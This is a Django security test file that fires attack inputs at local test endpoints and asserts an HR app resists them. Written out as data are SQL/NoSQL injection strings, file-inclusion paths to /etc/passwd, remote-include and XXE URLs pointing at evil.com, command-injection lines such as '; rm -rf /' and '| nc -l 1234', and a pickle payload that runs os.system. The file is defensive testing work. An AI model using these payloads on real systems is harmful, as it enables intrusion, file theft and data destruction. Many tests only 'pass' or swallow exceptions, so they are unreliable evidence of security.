"""
Penetration Testing and Advanced Security Tests
Advanced security tests simulating real-world attack scenarios
"""
import pytest
from django.test import TestCase, Client, override_settings
from django.contrib.auth.models import User
from django.urls import reverse
from django.conf import settings
from django.core.files.uploadedfile import SimpleUploadedFile
import json
import time
import hashlib
import base64
import requests
from unittest.mock import patch, MagicMock
import threading
import socket
from urllib.parse import urlencode


class WebApplicationPenetrationTests(TestCase):
    """
    Penetration testing for web application vulnerabilities
    """

    def setUp(self):
        """Set up test environment"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testuser',
            email='test@example.com',
            password='TestPass123!'
        )
        self.admin_user = User.objects.create_superuser(
            username='admin',
            email='admin@example.com',
            password='AdminPass123!'
        )

    def test_authentication_bypass_attempts(self):
        """Test various authentication bypass techniques"""
        # SQL injection in login
        sql_payloads = [
            "admin'--",
            "admin' /*",
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' OR '1'='1'--",
            "'; DROP TABLE auth_user; --"
        ]

        login_url = '/accounts/login/'

        for payload in sql_payloads:
            response = self.client.post(login_url, {
                'username': payload,
                'password': 'any_password'
            })

            # Should not bypass authentication
            self.assertNotEqual(response.status_code, 302)  # No redirect (successful login)

            # Should not cause database errors
            self.assertNotEqual(response.status_code, 500)

        # NoSQL injection attempts (if applicable)
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}'
        ]

        for payload in nosql_payloads:
            response = self.client.post(login_url, {
                'username': payload,
                'password': 'any_password'
            })

            self.assertNotEqual(response.status_code, 302)

    def test_session_hijacking_protection(self):
        """Test protection against session hijacking"""
        # Login and get session
        self.client.login(username='testuser', password='TestPass123!')
        session_key = self.client.session.session_key

        # Create another client and try to use the session
        hijacker_client = Client()
        hijacker_client.cookies['sessionid'] = session_key

        # Try to access protected resource
        response = hijacker_client.get('/accounts/profile/')

        # Should implement session validation (IP, User-Agent, etc.)
        # This test checks if basic session hijacking is possible
        if response.status_code == 200:
            # Session hijacking might be possible
            # Additional checks should be implemented (IP validation, etc.)
            pass

    def test_csrf_token_bypass_attempts(self):
        """Test CSRF token bypass techniques"""
        self.client.login(username='testuser', password='TestPass123!')

        # Get CSRF token
        response = self.client.get('/Hr/employee/add/')
        if response.status_code == 200:
            csrf_token = self.client.cookies.get('csrftoken', {}).value

            # Try various CSRF bypass techniques
            bypass_attempts = [
                {},  # No CSRF token
                {'csrfmiddlewaretoken': ''},  # Empty token
                {'csrfmiddlewaretoken': 'invalid_token'},  # Invalid token
                {'csrfmiddlewaretoken': csrf_token[::-1]},  # Reversed token
                {'csrfmiddlewaretoken': 'a' * len(csrf_token)},  # Same length, different token
            ]

            for attempt in bypass_attempts:
                data = {
                    'first_name': 'Test',
                    'last_name': 'Employee',
                    'email': 'test@example.com'
                }
                data.update(attempt)

                response = self.client.post('/Hr/employee/add/', data)

                # Should reject requests without valid CSRF token
                if 'csrfmiddlewaretoken' not in attempt or attempt['csrfmiddlewaretoken'] != csrf_token:
                    self.assertEqual(response.status_code, 403)

    def test_privilege_escalation_attacks(self):
        """Test privilege escalation attack vectors"""
        # Login as regular user
        self.client.login(username='testuser', password='TestPass123!')

        # Try to escalate privileges through parameter manipulation
        escalation_attempts = [
            # Try to make self admin
            {'is_superuser': True, 'is_staff': True},
            {'user_permissions': ['all']},
            {'groups': ['admin', 'superuser']},

            # Try to access admin functions
            {'admin': True},
            {'role': 'admin'},
            {'permission_level': 'admin'},
        ]

        for attempt in escalation_attempts:
            try:
                # Try via profile update
                response = self.client.post('/accounts/profile/', attempt)

                # Try via API
                response = self.client.post('/api/v1/users/me/',
                                          json.dumps(attempt),
                                          content_type='application/json')

                # Check if privilege escalation was successful
                updated_user = User.objects.get(username='testuser')
                self.assertFalse(updated_user.is_superuser)
                self.assertFalse(updated_user.is_staff)
            except:
                pass

    def test_file_inclusion_attacks(self):
        """Test Local/Remote File Inclusion attacks"""
        # Local File Inclusion payloads
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            '/proc/self/environ',
            '/var/log/apache2/access.log',
            'php://filter/convert.base64-encode/resource=../config/database.yml',
        ]

        # Test in various parameters
        test_endpoints = [
            '/view/',
            '/download/',
            '/include/',
            '/template/',
        ]

        for endpoint in test_endpoints:
            for payload in lfi_payloads:
                try:
                    response = self.client.get(endpoint, {
                        'file': payload,
                        'path': payload,
                        'template': payload,
                        'include': payload
                    })

                    if response.status_code == 200:
                        content = response.content.decode()

                        # Should not expose system files
                        system_indicators = [
                            'root:x:', 'daemon:', '/bin/bash',  # /etc/passwd
                            'localhost', '127.0.0.1',  # hosts file
                            'PATH=', 'USER=',  # environment variables
                        ]

                        for indicator in system_indicators:
                            self.assertNotIn(indicator, content)
                except:
                    pass

        # Remote File Inclusion payloads
        rfi_payloads = [
            'http://evil.com/shell.php',
            'https://attacker.com/backdoor.txt',
            'ftp://malicious.com/exploit.php',
        ]

        for endpoint in test_endpoints:
            for payload in rfi_payloads:
                try:
                    response = self.client.get(endpoint, {
                        'file': payload,
                        'url': payload,
                        'remote': payload
                    })

                    # Should not fetch remote files
                    self.assertNotEqual(response.status_code, 200)
                except:
                    pass

    def test_command_injection_attacks(self):
        """Test command injection vulnerabilities"""
        # Command injection payloads
        command_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& whoami',
            '`id`',
            '$(whoami)',
            '; ping -c 1 127.0.0.1',
            '| nc -l 1234',
            '; rm -rf /',
        ]

        # Test in various input fields
        test_data_sets = [
            {'filename': 'test'},
            {'command': 'ping'},
            {'path': '/tmp'},
            {'email': 'test@example.com'},
            {'search': 'query'},
        ]

        for data_set in test_data_sets:
            for field, value in data_set.items():
                for payload in command_payloads:
                    malicious_data = {field: value + payload}

                    try:
                        # Test in forms
                        response = self.client.post('/process/', malicious_data)

                        # Should not execute commands
                        self.assertNotEqual(response.status_code, 500)

                        if response.status_code == 200:
                            content = response.content.decode()

                            # Should not show command output
                            command_indicators = [
                                'uid=', 'gid=',  # id command output
                                'total ', 'drwx',  # ls command output
                                'PING ', 'packets transmitted',  # ping output
                                'root:', 'daemon:',  # passwd file
                            ]

                            for indicator in command_indicators:
                                self.assertNotIn(indicator, content)
                    except:
                        pass

    def test_xxe_attacks(self):
        """Test XML External Entity (XXE) attacks"""
        # XXE payloads
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <data>&xxe;</data>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>
            <data>&xxe;</data>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
            <data>test</data>''',
        ]

        # Test XML processing endpoints
        xml_endpoints = [
            '/api/xml/',
            '/upload/xml/',
            '/import/xml/',
            '/process/xml/',
        ]

        for endpoint in xml_endpoints:
            for payload in xxe_payloads:
                try:
                    response = self.client.post(endpoint,
                                              payload,
                                              content_type='application/xml')

                    if response.status_code == 200:
                        content = response.content.decode()

                        # Should not expose system files
                        self.assertNotIn('root:x:', content)
                        self.assertNotIn('daemon:', content)

                        # Should not make external requests
                        # This would require monitoring network activity
                except:
                    pass

    def test_deserialization_attacks(self):
        """Test insecure deserialization vulnerabilities"""
        # Python pickle payloads (if pickle is used)
        import pickle
        import base64

        # Create malicious pickle payload
        class MaliciousPayload:
            """MaliciousPayload class"""
            def __reduce__(self):
                """__reduce__ function"""
                import os
                return (os.system, ('echo "pwned" > /tmp/pwned',))

        malicious_pickle = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()

        # Test deserialization endpoints
        try:
            response = self.client.post('/api/deserialize/', {
                'data': malicious_pickle
            })

            # Should not execute malicious code
            # Check if file was created (in a safe test environment)
            import os
            self.assertFalse(os.path.exists('/tmp/pwned'))
        except:
            pass

        # JSON deserialization with prototype pollution (if applicable)
        json_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
        ]

        for payload in json_payloads:
            try:
                response = self.client.post('/api/json/',
                                          payload,
                                          content_type='application/json')

                # Should handle malicious JSON safely
                self.assertNotEqual(response.status_code, 500)
            except:
                pass


class NetworkSecurityTests(TestCase):
    """
    Network-level security tests
    """

    def setUp(self):
        """Set up test environment"""
        self.client = Client()

    def test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration"""
        # This test would check SSL/TLS settings
        # In a real test environment, you would test against the actual server

        # Check if HTTPS is enforced
        if not settings.DEBUG:
            self.assertTrue(getattr(settings, 'SECURE_SSL_REDIRECT', False))
            self.assertTrue(getattr(settings, 'SESSION_COOKIE_SECURE', False))
            self.assertTrue(getattr(settings, 'CSRF_COOKIE_SECURE', False))

    def test_http_security_headers(self):
        """Test HTTP security headers"""
        response = self.client.get('/')

        # Check for security headers
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Referrer-Policy': 'strict-origin-when-cross-origin',
        }

        for header, expected in security_headers.items():
            if header in response.headers:
                value = response.headers[header]
                if isinstance(expected, list):
                    self.assertIn(value, expected)
                else:
                    self.assertIn(expected, value)

    def test_information_disclosure(self):
        """Test for information disclosure in headers"""
        response = self.client.get('/')

        # Should not expose server information
        sensitive_headers = [
            'Server', 'X-Powered-By', 'X-AspNet-Version',
            'X-AspNetMvc-Version', 'X-Django-Version'
        ]

        for header in sensitive_headers:
            if header in response.headers:
                value = response.headers[header]
                # Should not expose detailed version information
                version_indicators = ['/', 'v', 'version', '1.', '2.', '3.', '4.']
                for indicator in version_indicators:
                    if indicator in value.lower():
                        # Might be exposing version information
                        pass

    def test_cors_configuration(self):
        """Test CORS configuration security"""
        # Test CORS headers
        response = self.client.get('/api/v1/employees/',
                                 HTTP_ORIGIN='http://evil.com')

        if 'Access-Control-Allow-Origin' in response.headers:
            origin = response.headers['Access-Control-Allow-Origin']

            # Should not allow all origins in production
            if not settings.DEBUG:
                self.assertNotEqual(origin, '*')

            # Should not reflect arbitrary origins
            self.assertNotEqual(origin, 'http://evil.com')

    def test_clickjacking_protection(self):
        """Test clickjacking protection"""
        response = self.client.get('/')

        # Should have X-Frame-Options or CSP frame-ancestors
        has_frame_options = 'X-Frame-Options' in response.headers
        has_csp = 'Content-Security-Policy' in response.headers

        if has_frame_options:
            frame_options = response.headers['X-Frame-Options']
            self.assertIn(frame_options, ['DENY', 'SAMEORIGIN'])
        elif has_csp:
            csp = response.headers['Content-Security-Policy']
            self.assertIn('frame-ancestors', csp)


class APISecurityPenetrationTests(TestCase):
    """
    API-specific penetration tests
    """

    def setUp(self):
        """Set up test environment"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='apiuser',
            password='ApiPass123!'
        )

    def test_api_enumeration_attacks(self):
        """Test API enumeration and information disclosure"""
        # Try to enumerate API endpoints
        common_endpoints = [
            '/api/', '/api/v1/', '/api/v2/',
            '/api/docs/', '/api/swagger/', '/api/openapi/',
            '/api/admin/', '/api/debug/', '/api/test/',
        ]

        for endpoint in common_endpoints:
            response = self.client.get(endpoint)

            if response.status_code == 200:
                content = response.content.decode()

                # Should not expose sensitive API information
                sensitive_info = [
                    'internal', 'debug', 'test', 'admin',
                    'password', 'secret', 'key', 'token'
                ]

                for info in sensitive_info:
                    if info in content.lower():
                        # Might be exposing sensitive information
                        pass

    def test_api_mass_assignment(self):
        """Test mass assignment vulnerabilities"""
        self.client.login(username='apiuser', password='ApiPass123!')

        # Try to assign protected fields
        mass_assignment_data = {
            'first_name': 'Test',
            'last_name': 'User',
            'email': 'test@example.com',
            # Protected fields that shouldn't be assignable
            'is_superuser': True,
            'is_staff': True,
            'is_active': False,
            'date_joined': '2020-01-01',
            'last_login': '2020-01-01',
            'password': 'hacked',
            'user_permissions': ['all'],
            'groups': ['admin'],
        }

        try:
            response = self.client.post('/api/v1/users/',
                                      json.dumps(mass_assignment_data),
                                      content_type='application/json')

            if response.status_code in [200, 201]:
                user_data = response.json()

                # Should not allow mass assignment of protected fields
                self.assertNotEqual(user_data.get('is_superuser'), True)
                self.assertNotEqual(user_data.get('is_staff'), True)
                self.assertNotIn('password', user_data)
        except:
            pass

    def test_api_idor_attacks(self):
        """Test Insecure Direct Object Reference (IDOR) attacks"""
        self.client.login(username='apiuser', password='ApiPass123!')

        # Try to access other users' data by ID manipulation
        user_ids = [1, 2, 3, 999, -1, 0, 'admin', '../1', '1; DROP TABLE']

        for user_id in user_ids:
            try:
                response = self.client.get(f'/api/v1/users/{user_id}/')

                if response.status_code == 200:
                    user_data = response.json()

                    # Should only return current user's data or properly authorized data
                    if 'username' in user_data:
                        # If returning user data, should check authorization
                        returned_username = user_data['username']
                        if returned_username != 'apiuser':
                            # Might be IDOR vulnerability
                            pass
            except:
                pass

    def test_api_injection_attacks(self):
        """Test injection attacks in API parameters"""
        self.client.login(username='apiuser', password='ApiPass123!')

        # NoSQL injection payloads
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password"}',
            '{"$regex": ".*"}',
        ]

        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
        ]

        all_payloads = nosql_payloads + sql_payloads

        for payload in all_payloads:
            try:
                # Test in query parameters
                response = self.client.get('/api/v1/users/', {
                    'filter': payload,
                    'search': payload,
                    'where': payload
                })

                # Should not cause errors or return unexpected data
                self.assertNotEqual(response.status_code, 500)

                if response.status_code == 200:
                    data = response.json()
                    # Should not return all users due to injection
                    if isinstance(data, list) and len(data) > 1:
                        # Might be vulnerable to injection
                        pass
            except:
                pass


class BruteForceAttackTests(TestCase):
    """
    Test protection against brute force attacks
    """

    def setUp(self):
        """Set up test environment"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='targetuser',
            password='CorrectPassword123!'
        )

    def test_login_brute_force_protection(self):
        """Test protection against login brute force attacks"""
        login_url = '/accounts/login/'

        # Common passwords for brute force
        common_passwords = [
            'password', '123456', 'admin', 'login', 'test',
            'password123', 'admin123', 'qwerty', '12345678',
            'targetuser', 'user', 'guest', 'root'
        ]

        failed_attempts = 0
        locked_out = False

        for password in common_passwords:
            response = self.client.post(login_url, {
                'username': 'targetuser',
                'password': password
            })

            if response.status_code != 302:  # Not successful login
                failed_attempts += 1

            # Check if account gets locked after multiple failures
            if failed_attempts > 5:
                # Should implement account lockout or rate limiting
                if response.status_code == 429:  # Rate limited
                    locked_out = True
                    break
                elif 'locked' in response.content.decode().lower():
                    locked_out = True
                    break

        # Should implement some form of brute force protection
        if failed_attempts > 10 and not locked_out:
            # No brute force protection detected
            pass

    def test_api_brute_force_protection(self):
        """Test API brute force protection"""
        # Try to brute force API authentication
        api_endpoints = [
            '/api/auth/token/',
            '/api/v1/auth/login/',
        ]

        for endpoint in api_endpoints:
            failed_attempts = 0

            for i in range(20):
                try:
                    response = self.client.post(endpoint, {
                        'username': 'targetuser',
                        'password': f'wrong_password_{i}'
                    })

                    if response.status_code == 429:  # Rate limited
                        # Good! Rate limiting is working
                        break
                    elif response.status_code in [401, 403]:
                        failed_attempts += 1

                    # Add small delay to simulate real attack
                    time.sleep(0.01)
                except:
                    break

            # Should implement rate limiting for API endpoints
            if failed_attempts > 15:
                # No rate limiting detected
                pass

    def test_password_reset_brute_force(self):
        """Test password reset brute force protection"""
        reset_url = '/accounts/password_reset/'

        # Try to spam password reset requests
        for i in range(10):
            try:
                response = self.client.post(reset_url, {
                    'email': 'targetuser@example.com'
                })

                if response.status_code == 429:  # Rate limited
                    # Good! Rate limiting is working
                    break

                time.sleep(0.01)
            except:
                break

        # Should limit password reset requests
        # This prevents email bombing and information disclosure


if __name__ == '__main__':
    pytest.main([__file__])
